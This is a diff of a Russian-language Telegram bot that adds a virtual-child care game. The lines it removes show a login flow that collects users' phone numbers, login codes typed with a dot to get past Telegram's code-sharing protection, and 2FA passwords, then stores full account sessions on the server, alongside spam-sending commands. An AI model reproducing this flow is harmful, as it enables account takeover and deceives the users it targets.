@@ -4,7 +4,7 @@ import psycopg2
 import re
 import logging
 import math
-from datetime import datetime, timedelta
+from datetime import datetime, timezone, timedelta
 from typing import Dict, Set, List, Optional, Tuple
 
 from aiogram import Bot, Dispatcher, F
@@ -105,6 +105,65 @@ TEXT_COMMANDS_HELP = (
     "• Просто напишите пример: <code>1458+2414</code>"
 )
 
+# ==================== КОНСТАНТЫ РЕБЁНКА ====================
+NEEDS = ["hunger", "toilet", "sleep_need", "hygiene", "mood", "attention"]
+
+NEED_LABELS = {
+    "hunger": ("Голод", "🍖"),
+    "toilet": ("Туалет", "🚽"),
+    "sleep_need": ("Сон", "😴"),
+    "hygiene": ("Гигиена", "🛁"),
+    "mood": ("Настроение", "🙂"),
+    "attention": ("Внимание", "🫂"),
+}
+
+DECAY_PER_TICK = {
+    "hunger": 3,
+    "toilet": 4,
+    "sleep_need": 2,
+    "hygiene": 2,
+    "mood": 2,
+    "attention": 2,
+}
+
+TICK_MINUTES = 30
+REMINDER_THRESHOLD = 25
+HEALTH_DECAY_IF_CRITICAL = 3
+HEALTH_REGEN_IF_OK = 1
+GAME_YEAR_IN_REAL_DAYS = 4
+
+REMINDER_PHRASES = {
+    "hunger": "хочу кушать 🍖",
+    "toilet": "мне нужно в туалет 🚽",
+    "sleep_need": "я хочу спать 😴",
+    "hygiene": "я хочу помыться 🛁",
+    "mood": "мне скучно, поиграй со мной 🙂",
+    "attention": "мне не хватает внимания 🫂",
+}
+
+ACTION_LABELS = {
+    "hunger": "Покормить",
+    "toilet": "Сводить в туалет",
+    "sleep_need": "Уложить спать",
+    "hygiene": "Помыть",
+    "mood": "Поиграть",
+    "attention": "Пообщаться",
+}
+
+BIRTH_RULES_TEXT = (
+    "У {gender_word_small} есть потребности, и они настоящие — \n"
+    "за ними правда нужно следить.\n"
+    "Если не следить за ребёнком, \n"
+    "он может умереть, \n"
+    "и это уже никак не исправить.\n\n"
+    "Береги {pronoun_acc} 🙂"
+)
+
+RESTORE_AMOUNT = {
+    "hunger": 40, "toilet": 50, "sleep_need": 35,
+    "hygiene": 45, "mood": 30, "attention": 30,
+}
+
 # ==================== БАЗА ДАННЫХ ====================
 def get_db():
     return psycopg2.connect(DATABASE_URL, sslmode='require')
@@ -180,6 +239,26 @@ def init_db():
                         PRIMARY KEY (user_id, chat_id)
                     )
                 """)
+                # ===== ТАБЛИЦА ДЛЯ РЕБЁНКА =====
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS children (
+                        id SERIAL PRIMARY KEY,
+                        owner_id BIGINT NOT NULL,
+                        name TEXT NOT NULL,
+                        gender TEXT NOT NULL,
+                        health INTEGER NOT NULL DEFAULT 100,
+                        hunger INTEGER NOT NULL DEFAULT 100,
+                        toilet INTEGER NOT NULL DEFAULT 100,
+                        sleep_need INTEGER NOT NULL DEFAULT 100,
+                        hygiene INTEGER NOT NULL DEFAULT 100,
+                        mood INTEGER NOT NULL DEFAULT 100,
+                        attention INTEGER NOT NULL DEFAULT 100,
+                        is_alive BOOLEAN NOT NULL DEFAULT TRUE,
+                        birth_date DATE NOT NULL DEFAULT CURRENT_DATE,
+                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        last_birthday_year INTEGER NOT NULL DEFAULT 0
+                    )
+                """)
                 conn.commit()
                 
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
@@ -248,6 +327,40 @@ def get_user_chats(user_id: int) -> List[Tuple[int, str]]:
                 return chats
     except Exception as e:
         logging.error(f"Ошибка получения чатов: {e}")
+        return []
+
+def delete_user_chat(user_id: int, chat_id: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM user_chats WHERE user_id = %s AND chat_id = %s", (user_id, chat_id))
+                conn.commit()
+                if user_id in user_dialogs:
+                    user_dialogs[user_id] = [c for c in user_dialogs[user_id] if c[0] != chat_id]
+    except Exception as e:
+        logging.error(f"Ошибка удаления чата: {e}")
+
+def delete_all_user_chats(user_id: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
+                conn.commit()
+                if user_id in user_dialogs:
+                    user_dialogs[user_id] = []
+                return 0
+    except Exception as e:
+        logging.error(f"Ошибка удаления чатов: {e}")
+        return 0
+
+def get_business_accounts():
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
+                return cur.fetchall()
+    except Exception as e:
+        logging.error(f"Ошибка получения бизнес-аккаунтов: {e}")
         return []
 
 def save_session(user_id: int, session_str: str):
@@ -321,17 +434,6 @@ def delete_business_account(user_id: int):
                 conn.commit()
     except Exception as e:
         logging.error(f"Ошибка удаления бизнес-аккаунта: {e}")
-
-def delete_all_user_chats(user_id: int):
-    try:
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
-                conn.commit()
-                if user_id in user_dialogs:
-                    user_dialogs[user_id] = []
-    except Exception as e:
-        logging.error(f"Ошибка удаления чатов: {e}")
 
 def save_user_info(user_id: int, username: str, first_name: str):
     user_id = int(user_id)
@@ -603,6 +705,165 @@ def is_calculator_expression(text: str) -> bool:
             if op in cleaned: return True
     return False
 
+# ==================== ФУНКЦИИ РЕБЁНКА ====================
+def get_alive_child(owner_id: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "SELECT id, name, gender, health, hunger, toilet, sleep_need, hygiene, "
+                    "mood, attention, birth_date, last_birthday_year "
+                    "FROM children WHERE owner_id = %s AND is_alive = TRUE",
+                    (owner_id,)
+                )
+                row = cur.fetchone()
+                if not row:
+                    return None
+                keys = ["id", "name", "gender", "health", "hunger", "toilet", "sleep_need",
+                        "hygiene", "mood", "attention", "birth_date", "last_birthday_year"]
+                return dict(zip(keys, row))
+    except Exception as e:
+        logging.error(f"Ошибка получения ребенка: {e}")
+        return None
+
+def create_child(owner_id: int, name: str, gender: str):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "INSERT INTO children (owner_id, name, gender) VALUES (%s, %s, %s) "
+                    "RETURNING id, birth_date",
+                    (owner_id, name, gender)
+                )
+                child_id, birth_date = cur.fetchone()
+                conn.commit()
+                return {"id": child_id, "name": name, "gender": gender, "birth_date": birth_date}
+    except Exception as e:
+        logging.error(f"Ошибка создания ребенка: {e}")
+        return None
+
+def update_child_field(child_id: int, field: str, value: int):
+    value = max(0, min(100, value))
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(f"UPDATE children SET {field} = %s WHERE id = %s", (value, child_id))
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка обновления {field}: {e}")
+
+def update_child_full(child_id: int, health: int, needs: dict):
+    health = max(0, min(100, health))
+    needs = {k: max(0, min(100, v)) for k, v in needs.items()}
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "UPDATE children SET health=%s, hunger=%s, toilet=%s, sleep_need=%s, "
+                    "hygiene=%s, mood=%s, attention=%s WHERE id=%s",
+                    (health, needs["hunger"], needs["toilet"], needs["sleep_need"],
+                     needs["hygiene"], needs["mood"], needs["attention"], child_id)
+                )
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка полного обновления ребенка: {e}")
+
+def kill_child(child_id: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("UPDATE children SET is_alive = FALSE WHERE id = %s", (child_id,))
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка при 'смерти' ребенка: {e}")
+
+def get_all_alive_children_full():
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute(
+                    "SELECT id, owner_id, name, gender, health, hunger, toilet, sleep_need, "
+                    "hygiene, mood, attention, birth_date, last_birthday_year "
+                    "FROM children WHERE is_alive = TRUE"
+                )
+                rows = cur.fetchall()
+                keys = ["id", "owner_id", "name", "gender", "health", "hunger", "toilet",
+                        "sleep_need", "hygiene", "mood", "attention", "birth_date", "last_birthday_year"]
+                return [dict(zip(keys, r)) for r in rows]
+    except Exception as e:
+        logging.error(f"Ошибка получения списка детей: {e}")
+        return []
+
+def set_last_birthday_year(child_id: int, year: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("UPDATE children SET last_birthday_year = %s WHERE id = %s", (year, child_id))
+                conn.commit()
+    except Exception as e:
+        logging.error(f"Ошибка обновления last_birthday_year: {e}")
+
+def get_game_age(birth_date) -> tuple:
+    if isinstance(birth_date, datetime):
+        birth_date = birth_date.date()
+    real_days = (datetime.now(timezone.utc).date() - birth_date).days
+    game_days_total = (real_days / GAME_YEAR_IN_REAL_DAYS) * 365
+    years = int(game_days_total // 365)
+    months = int((game_days_total % 365) // 30)
+    return years, months
+
+def age_stage_word(years: int) -> str:
+    if years < 1:
+        return "младенец 👶"
+    elif years < 5:
+        return "малыш 🧒"
+    elif years < 12:
+        return "ребёнок 🧒"
+    else:
+        return "подросток 🧑"
+
+def bar(value: int, length: int = 10) -> str:
+    filled = round(value / 100 * length)
+    return "▓" * filled + "░" * (length - filled)
+
+def child_status_text(child: dict) -> str:
+    years, months = get_game_age(child["birth_date"])
+    gender_word = "Сын" if child["gender"] == "m" else "Дочь"
+    lines = [f"👶 {gender_word}: {child['name']} — {years} г. {months} мес. ({age_stage_word(years)})",
+             f"❤️ Здоровье:  {bar(child['health'])} {child['health']}"]
+    for key in NEEDS:
+        label, emoji = NEED_LABELS[key]
+        lines.append(f"{emoji} {label}: {bar(child[key])} {child[key]}")
+    return "\n".join(lines)
+
+def child_action_keyboard(child_id: int, highlight: str = None) -> InlineKeyboardMarkup:
+    rows = []
+    pair = []
+    for key in NEEDS:
+        text = ACTION_LABELS[key]
+        if key == highlight:
+            text = "👉 " + text
+        pair.append(InlineKeyboardButton(text=text, callback_data=f"child_{key}_{child_id}"))
+        if len(pair) == 2:
+            rows.append(pair)
+            pair = []
+    if pair:
+        rows.append(pair)
+    rows.append([InlineKeyboardButton(text="💊 Полечить", callback_data=f"child_heal_{child_id}")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+def birth_rules_text(name: str, gender: str, birth_date) -> str:
+    gender_word = "него" if gender == "m" else "неё"
+    pronoun_acc = "его" if gender == "m" else "её"
+    born_word = "родился" if gender == "m" else "родилась"
+    who_word = "Сын" if gender == "m" else "Дочь"
+    date_str = birth_date.strftime("%d.%m.%Y") if hasattr(birth_date, "strftime") else str(birth_date)
+    return (
+        f"🎉 Поздравляю, {born_word} {who_word.lower()} — {name}!\n"
+        f"День рождения: {date_str}\n\n"
+        + BIRTH_RULES_TEXT.format(gender_word_small=gender_word, pronoun_acc=pronoun_acc)
+    )
+
 # ==================== TELETHON ФУНКЦИИ ====================
 async def get_user_dialogs(client: TelegramClient) -> List[Tuple[int, str]]:
     dialogs = []
@@ -735,501 +996,155 @@ async def admin_panel(message: Message):
     if message.from_user.id != ADMIN_ID: return
     await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
 
-@dp.callback_query(F.data == "btn_features")
-async def features(callback: CallbackQuery):
-    await callback.answer()
-    await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
-
-@dp.callback_query(F.data == "btn_how_to_connect")
-async def how_to_connect(callback: CallbackQuery):
-    await callback.answer()
-    await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
-
-# ==================== АВТОРИЗАЦИЯ (ТОЛЬКО SMS, QR УБРАЛ) ====================
-@dp.callback_query(F.data == "btn_group_auth")
-async def group_auth(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    if get_session(callback.from_user.id):
-        await callback.message.answer("✅ Аккаунт уже подключен!")
+# ==================== КОМАНДЫ РЕБЁНКА ====================
+@dp.message(F.text.regexp(r"(?i)^родить (сына|дочь) (.+)$"))
+async def cmd_give_birth(message: Message):
+    import re
+    m = re.match(r"(?i)^родить (сына|дочь) (.+)$", message.text.strip())
+    if not m:
+        await message.answer("❌ Неверный формат. Используй: родить сына Имя или родить дочь Имя")
         return
-    
-    # ===== ТОЛЬКО SMS! QR УБРАЛ! =====
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
-    
-    await callback.message.answer(
-        "🔐 <b>Аккаунт используется ТОЛЬКО для авторассылки.</b>\n"
-        "Личная переписка не читается и не сохраняется.\n\n"
-        "📱 <b>Введите номер телефона</b>\n\n"
-        "Отправьте номер в формате:\n"
-        "<code>79123456789</code>\n\n"
-        "Или нажмите кнопку ниже для отправки контакта.",
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-    await state.set_state(AuthState.waiting_for_phone)
+    gender = "m" if m.group(1).lower() == "сына" else "f"
+    name = m.group(2).strip()
 
-@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
-async def process_phone(message: Message, state: FSMContext):
-    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
-    try:
-        if message.contact:
-            phone = message.contact.phone_number
-        elif message.text:
-            phone = re.sub(r'[^\d+]', '', message.text.strip())
-            if phone.startswith('8') and len(phone) == 11:
-                phone = '+7' + phone[1:]
-            elif not phone.startswith('+'):
-                phone = '+' + phone
-        else:
-            await message.answer("❌ Отправь номер телефоном или контактом")
-            return
-        
-        logging.info(f"📱 Номер: {phone}")
-        
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        await client.send_code_request(phone)
-        
-        await state.update_data(
-            phone=phone,
-            client=client
-        )
-        
-        # ===== КНОПКА "ПОСМОТРЕТЬ КОД" =====
-        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
-            [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="btn_group_auth")]
-        ])
-        
-        await message.answer(
-            f"📱 <b>Код подтверждения отправлен!</b>\n\n"
-            f"Номер: <code>{phone}</code>\n\n"
-            f"⚠️ <b>ВАЖНО:</b>\n"
-            f"1️⃣ Нажми «Посмотреть код»\n"
-            f"2️⃣ Открой Telegram и посмотри код\n"
-            f"3️⃣ <b>Введи код с точкой внутри</b>\n"
-            f"<i>Например: 56.785</i>",
-            parse_mode="HTML",
-            reply_markup=view_code_kb
-        )
-        await state.set_state(AuthState.waiting_for_code)
-        
-    except FloodWaitError as e:
-        await message.answer(f"⏳ Подожди {e.seconds} секунд")
-        await state.clear()
-    except Exception as e:
-        logging.error(f"Ошибка: {e}")
-        await message.answer(f"❌ Ошибка: {str(e)}")
-        await state.clear()
+    existing = get_alive_child(message.from_user.id)
+    if existing:
+        await message.answer(f"У тебя уже есть ребёнок — {existing['name']}. Сначала позаботься о нём 🙂")
+        return
 
-@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
-async def process_code(message: Message, state: FSMContext):
-    # ===== УБИРАЕМ ТОЧКИ =====
-    code_raw = message.text.strip()
-    code = code_raw.replace('.', '')
-    
-    logging.info(f"Код: {code_raw} -> {code}")
-    
-    if not code.isdigit():
-        await message.answer(
-            "❌ <b>Неверный формат!</b>\n\n"
-            "Код должен содержать только цифры и точку.\n"
-            "Например: <code>56.785</code>",
-            parse_mode="HTML"
-        )
+    child = create_child(message.from_user.id, name, gender)
+    if not child:
+        await message.answer("❌ Не получилось, попробуй позже.")
         return
-    
-    data = await state.get_data()
-    phone = data.get("phone")
-    client = data.get("client")
-    
-    if not phone or not client:
-        await message.answer("❌ Данные устарели. Начни заново")
-        await state.clear()
-        return
-    
-    await message.answer("🔄 Проверка кода...")
-    
-    try:
-        await client.sign_in(phone=phone, code=code)
-        
-        final_session = client.session.save()
-        save_session(message.from_user.id, final_session)
-        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
-        await start_telethon_listener(message.from_user.id, final_session)
-        
-        await client.disconnect()
-        
-        await message.answer(
-            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-            f"📊 Бот загрузил все твои чаты.\n"
-            f"Теперь он работает в группах от твоего имени.\n\n"
-            f"{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.clear()
-        
-    except SessionPasswordNeededError:
-        await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
-        await state.set_state(AuthState.waiting_for_2fa)
-        
-    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-        await message.answer(
-            "❌ <b>Неверный код!</b>\n\n"
-            "Проверь код и попробуй еще раз.\n"
-            "⚠️ Не забудь поставить точку внутри кода.\n"
-            "Например: <code>56.785</code>",
-            parse_mode="HTML"
-        )
-        
-    except Exception as e:
-        logging.error(f"Ошибка: {e}")
-        await message.answer(f"❌ Ошибка: {str(e)}")
-        await state.clear()
 
-@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
-async def process_2fa(message: Message, state: FSMContext):
-    password = message.text.strip()
-    data = await state.get_data()
-    client = data.get("client")
-    phone = data.get("phone")
-    
-    if not client or not phone:
-        await message.answer("❌ Данные устарели. Начни заново")
-        await state.clear()
-        return
-    
-    try:
-        await client.sign_in(password=password)
-        
-        final_session = client.session.save()
-        save_session(message.from_user.id, final_session)
-        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-        
-        await start_telethon_listener(message.from_user.id, final_session)
-        
-        await client.disconnect()
-        
-        await message.answer(
-            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-            f"📊 Бот загрузил все твои чаты.\n"
-            f"Теперь он работает в группах от твоего имени.\n\n"
-            f"{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML",
-            reply_markup=ReplyKeyboardRemove()
-        )
-        await state.clear()
-        
-    except Exception as e:
-        await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")
-
-# ==================== ОТКЛЮЧЕНИЕ ====================
-@dp.message(Command("disconnect"))
-async def cmd_disconnect(message: Message):
-    if message.chat.type != "private":
-        await message.answer("❌ Используйте в личных сообщениях.")
-        return
-    user_id = message.from_user.id
-    if not get_session(user_id):
-        await message.answer("❌ У вас нет активной сессии.")
-        return
-    delete_session(user_id)
-    if user_id in telethon_clients:
-        try:
-            await telethon_clients[user_id].disconnect()
-        except:
-            pass
-        del telethon_clients[user_id]
-    delete_all_user_chats(user_id)
-    delete_business_account(user_id)
     await message.answer(
-        "✅ <b>Аккаунт отключен!</b>\n\n"
-        "🔒 Все данные удалены с сервера:\n"
-        "• Сессия удалена\n"
-        "• Все чаты удалены\n"
-        "• Данные пользователя удалены",
-        parse_mode="HTML",
-        reply_markup=ReplyKeyboardRemove()
+        birth_rules_text(child["name"], child["gender"], child["birth_date"])
     )
 
-# ==================== ОСНОВНОЙ ОБРАБОТЧИК ====================
-@dp.message()
-@dp.business_message()
-async def handle(message: Message):
-    global bot_id, CHANNEL_LINK
-    try:
-        if not message.from_user or message.from_user.is_bot: return
-        uid = int(message.from_user.id)
-        chat_id = int(message.chat.id)
-        bc_id = message.business_connection_id
-        save_user_info(uid, message.from_user.username, message.from_user.first_name)
-        owner_id = bc_owners.get(bc_id) if bc_id else None
+@dp.message(F.text.regexp(r"(?i)^наш (сын|дочь)$"))
+async def cmd_child_status(message: Message):
+    child = get_alive_child(message.from_user.id)
+    if not child:
+        await message.answer("У тебя пока нет ребёнка. Напиши: родить сына Имя / родить дочь Имя")
+        return
+    await message.answer(child_status_text(child), reply_markup=child_action_keyboard(child["id"]))
 
-        if bc_id:
-            chat_name = message.chat.title or message.chat.first_name or "Чат"
-            save_user_chat(uid, chat_id, chat_name)
-            chat_tuple = (chat_id, bc_id)
-            if chat_tuple in recent_business_chats:
-                recent_business_chats.remove(chat_tuple)
-            recent_business_chats.append(chat_tuple)
-            if len(recent_business_chats) > 100:
-                recent_business_chats.pop(0)
+# ==================== ОБРАБОТЧИК КНОПОК РЕБЁНКА ====================
+@dp.callback_query(F.data.startswith("child_"))
+async def cb_child_action(callback: CallbackQuery):
+    parts = callback.data.split("_")
+    action = parts[1]
+    child_id = int(parts[2])
 
-        if uid in banned_users or (owner_id and owner_id in banned_users): return
+    child = get_alive_child(callback.from_user.id)
+    if not child or child["id"] != child_id:
+        await callback.answer("Ребёнок не найден или уже умер 💀", show_alert=True)
+        return
 
-        if bc_id:
-            if bc_id not in bc_owners:
-                try:
-                    conn_info = await bot.get_business_connection(bc_id)
-                    bc_owners[bc_id] = int(conn_info.user.id)
-                    save_user_info(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
-                    save_business_account(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
-                    owner_id = int(conn_info.user.id)
-                except: pass
-            is_from_me = (uid == owner_id) if owner_id else False
-        else:
-            is_from_me = (uid == chat_id) or (message.chat.type in ["group", "supergroup"])
+    if action == "heal":
+        update_child_field(child_id, "health", child["health"] + 25)
+        await callback.answer("💊 Полечили!")
+    elif action in NEEDS:
+        update_child_field(child_id, action, child[action] + RESTORE_AMOUNT[action])
+        await callback.answer("✅ Готово!")
+    else:
+        await callback.answer()
+        return
 
-        if bot_id is None:
-            me = await bot.get_me()
-            bot_id = me.id
+    child = get_alive_child(callback.from_user.id)
+    await callback.message.edit_text(child_status_text(child), reply_markup=child_action_keyboard(child["id"]))
 
-        if bc_id:
-            if bc_id not in active_chats: active_chats[bc_id] = set()
-            active_chats[bc_id].add(chat_id)
+# ==================== ФОНОВЫЕ ЗАДАЧИ РЕБЁНКА ====================
+async def child_decay_loop():
+    while True:
+        await asyncio.sleep(TICK_MINUTES * 60)
+        try:
+            children = get_all_alive_children_full()
+            for child in children:
+                old_values = {k: child[k] for k in NEEDS}
+                new_values = {}
+                critical_count = 0
+                reminders_to_send = []
 
-        if message.text:
-            cache_key = (chat_id, message.message_id)
-            msg_cache[cache_key] = {
-                "text": message.text, 
-                "user": message.from_user.first_name or "Пользователь",
-                "user_id": uid,
-                "chat_id": chat_id,
-                "bc_id": bc_id
-            }
-            if len(msg_cache) > 5000:
-                msg_cache.pop(next(iter(msg_cache)))
+                for key in NEEDS:
+                    old_val = old_values[key]
+                    new_val = max(0, old_val - DECAY_PER_TICK[key])
+                    new_values[key] = new_val
+                    if new_val <= REMINDER_THRESHOLD:
+                        critical_count += 1
+                        if old_val > REMINDER_THRESHOLD:
+                            reminders_to_send.append(key)
 
-        if uid in mutes and datetime.now() < mutes[uid]["until"]:
-            await delete_msg(chat_id, message.message_id, bc_id)
-            return
+                if critical_count > 0:
+                    new_health = child["health"] - HEALTH_DECAY_IF_CRITICAL * critical_count
+                else:
+                    new_health = child["health"] + HEALTH_REGEN_IF_OK
+                new_health = max(0, min(100, new_health))
 
-        if not is_from_me: return
-
-        if chat_id in reply_guard_chats and message.reply_to_message:
-            await delete_msg(chat_id, message.message_id, bc_id)
-            return
-
-        text_raw = message.text
-        if not text_raw: return
-        low = text_raw.lower().strip()
-        task_key = (chat_id, bc_id)
-        current_owner = owner_id or uid
-
-        if is_calculator_expression(text_raw):
-            result, error = calculate_expression(text_raw)
-            if result is not None:
-                formatted_result = f"{result:.10f}".rstrip('0').rstrip('.') if isinstance(result, float) else str(result)
-                new_text = f"{text_raw} = <b>{formatted_result}</b>"
-                edited = await edit_message(chat_id, message.message_id, new_text, bc_id, parse_mode="HTML")
-                if not edited:
+                if new_health <= 0:
+                    kill_child(child["id"])
+                    gender_word = "Сын" if child["gender"] == "m" else "Дочь"
+                    died_word = "умер" if child["gender"] == "m" else "умерла"
                     try:
-                        kwargs = {"chat_id": chat_id, "text": new_text, "parse_mode": "HTML"}
-                        if bc_id: kwargs["business_connection_id"] = bc_id
-                        await bot.send_message(**kwargs)
-                    except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
-                return
-            elif error:
-                try:
-                    kwargs = {"chat_id": chat_id, "text": error, "parse_mode": "HTML"}
-                    if bc_id: kwargs["business_connection_id"] = bc_id
-                    await bot.send_message(**kwargs)
-                except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
-                return
+                        await bot.send_message(
+                            child["owner_id"],
+                            f"💀 {gender_word} {child['name']} {died_word}. Это необратимо.\n\n"
+                            f"Можешь родить нового: родить сына/дочь Имя"
+                        )
+                    except Exception:
+                        pass
+                    continue
 
-        if low == ".стоп":
-            save_setting(chat_id, 'enabled_links', False)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low == ".старт":
-            save_setting(chat_id, 'enabled_links', True)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low.startswith("+линк"):
-            parts = text_raw.split(maxsplit=1)
-            if len(parts) > 1:
-                new_link = parts[1].strip()
-                if not new_link.startswith("http"): new_link = "https://t.me/" + new_link.lstrip("@")
-                CHANNEL_LINK = new_link
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low.startswith("подмена "):
-            parts = text_raw.split(maxsplit=2)
-            if len(parts) >= 2:
-                if parts[1].lower() == "выкл":
-                    save_substitution(chat_id, None, None)
-                else:
-                    mode = int(parts[2]) if len(parts) == 3 and parts[2] in ["1", "2"] else 1
-                    save_substitution(chat_id, parts[1], mode)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low == "печать -":
-            save_setting(chat_id, 'typing_disabled', True)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low == "печать +":
-            save_setting(chat_id, 'typing_disabled', False)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low == "+реплай":
-            save_setting(chat_id, 'reply_guard', True)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low == "-реплай":
-            save_setting(chat_id, 'reply_guard', False)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low == "ss":
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            text = user_spam_texts.get(str(current_owner))
-            if not text:
-                kwargs = {
-                    "chat_id": chat_id,
-                    "text": "⚠️ Сначала задайте текст через команду: <code>set [текст]</code>",
-                    "parse_mode": "HTML"
-                }
-                if bc_id: kwargs["business_connection_id"] = bc_id
-                await bot.send_message(**kwargs)
-                return
-            reply_to = message.reply_to_message.message_id if message.reply_to_message else None
-            if task_key in spam_tasks: spam_tasks[task_key].cancel()
-            spam_tasks[task_key] = asyncio.create_task(spam_worker(chat_id, bc_id, reply_to, text))
-            return
-        if low == "dd":
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            if task_key in spam_tasks:
-                spam_tasks[task_key].cancel()
-                del spam_tasks[task_key]
-            return
-        if low.startswith("set "):
-            save_spam_text(str(current_owner), text_raw[4:].strip())
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            return
-        if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
-            try:
-                minutes = int(re.search(r"\d+", text_raw).group())
-                if message.reply_to_message and message.reply_to_message.from_user:
-                    target_user = message.reply_to_message.from_user
-                    target_id = target_user.id
-                    target_name = target_user.first_name
-                else:
-                    target_id = chat_id
-                    target_name = message.chat.first_name or "Пользователь"
-                mutes[target_id] = {"until": datetime.now() + timedelta(minutes=minutes)}
-                asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
-                await clear_cmd(chat_id, message.message_id, bc_id)
-                user_link = get_user_mention(target_id, target_name)
-                kwargs = {
-                    "chat_id": chat_id,
-                    "text": f"🔇 {user_link} выдан <b>МУТ</b> на {minutes} мин.",
-                    "parse_mode": "HTML"
-                }
-                if bc_id: kwargs["business_connection_id"] = bc_id
-                await bot.send_message(**kwargs)
-            except: pass
-            return
-        if low in [".размут", "!размут"]:
-            if message.reply_to_message and message.reply_to_message.from_user:
-                target_user = message.reply_to_message.from_user
-                target_id = target_user.id
-                target_name = target_user.first_name
-            else:
-                target_id = chat_id
-                target_name = message.chat.first_name or "Пользователь"
-            mutes.pop(target_id, None)
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            user_link = get_user_mention(target_id, target_name)
-            kwargs = {
-                "chat_id": chat_id,
-                "text": f"🔊 С {user_link} снят <b>МУТ</b>.",
-                "parse_mode": "HTML"
-            }
-            if bc_id: kwargs["business_connection_id"] = bc_id
-            await bot.send_message(**kwargs)
-            return
-        if low in ["мой ид", "моид"]:
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            my_link = get_user_mention(uid, message.from_user.first_name)
-            kwargs = {
-                "chat_id": chat_id,
-                "text": f"🆔 {my_link} (<code>{uid}</code>)",
-                "parse_mode": "HTML"
-            }
-            if bc_id: kwargs["business_connection_id"] = bc_id
-            await bot.send_message(**kwargs)
-            return
-        if low in ["твой ид", "твоид"]:
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            target_user = message.reply_to_message.from_user if message.reply_to_message else None
-            target_id = target_user.id if target_user else (chat_id if chat_id > 0 else None)
-            if target_id:
-                t_fname = target_user.first_name if target_user else None
-                t_link = get_user_mention(target_id, t_fname)
-                kwargs = {
-                    "chat_id": chat_id,
-                    "text": f"🆔 {t_link} (<code>{target_id}</code>)",
-                    "parse_mode": "HTML"
-                }
-                if bc_id: kwargs["business_connection_id"] = bc_id
-                await bot.send_message(**kwargs)
-            return
-        if low == "!команды":
-            await clear_cmd(chat_id, message.message_id, bc_id)
-            kwargs = {
-                "chat_id": chat_id,
-                "text": TEXT_COMMANDS_HELP,
-                "parse_mode": "HTML"
-            }
-            if bc_id: kwargs["business_connection_id"] = bc_id
-            await bot.send_message(**kwargs)
-            return
